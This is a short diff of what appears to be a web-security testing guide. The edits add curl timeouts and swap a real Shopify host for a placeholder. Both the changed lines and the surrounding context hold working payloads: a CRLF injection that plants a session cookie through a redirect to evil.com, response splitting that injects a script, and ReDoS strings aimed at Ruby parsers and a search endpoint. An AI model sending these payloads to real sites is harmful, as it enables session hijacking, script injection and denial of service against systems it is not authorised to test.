@@ -114,7 +114,7 @@ curl --max-time 30 --connect-timeout 10 -v "https://target.com/path" \
 curl --max-time 30 --connect-timeout 10 -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
 
 # Test in pitchfork/Rack apps — inject via query param reflected in Location header
-curl --max-time 30 --connect-timeout 10 -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+curl --max-time 30 --connect-timeout 10 -v "https://shop.[SHOPIFY_STORE]/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
 ```
 
 **Privilege escalation via invitation bypass:**
@@ -157,8 +157,8 @@ ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'
 ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'
 
 # Timing-based detection
-time curl "https://target.com/search?q=aaaa" # baseline
-time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
+time curl --max-time 30 --connect-timeout 10 "https://target.com/search?q=aaaa" # baseline
+time curl --max-time 30 --connect-timeout 10 "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
 ```
 
 **Grep patterns for source recon:**
